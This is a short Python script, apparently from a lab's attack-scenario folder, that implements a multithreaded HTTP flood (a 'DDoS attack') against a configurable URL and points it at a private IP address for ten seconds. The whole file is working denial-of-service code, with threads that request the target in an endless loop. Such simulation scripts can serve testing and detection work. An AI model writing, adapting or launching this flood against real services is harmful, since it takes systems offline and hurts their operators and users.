# attack_scenarios/ddos_attack.py
import requests
import threading
import time

class DDoSAttack:
    def __init__(self, target_url, threads=20):
        self.target_url = target_url
        self.threads = threads

    def flood(self):
        while True:
            try:
                requests.get(self.target_url, timeout=0.5)
                print(f"[DDoS] Request sent to {self.target_url}")
            except:
                print(f"[DDoS] Target {self.target_url} unavailable")
            time.sleep(0.2)

    def execute(self):
        print(f"[DDoS] Launching {self.threads}-thread DDoS attack on {self.target_url}")
        for _ in range(self.threads):
            threading.Thread(target=self.flood, daemon=True).start()

if __name__ == "__main__":
    atk = DDoSAttack("http://172.20.0.11")
    atk.execute()
    time.sleep(10)
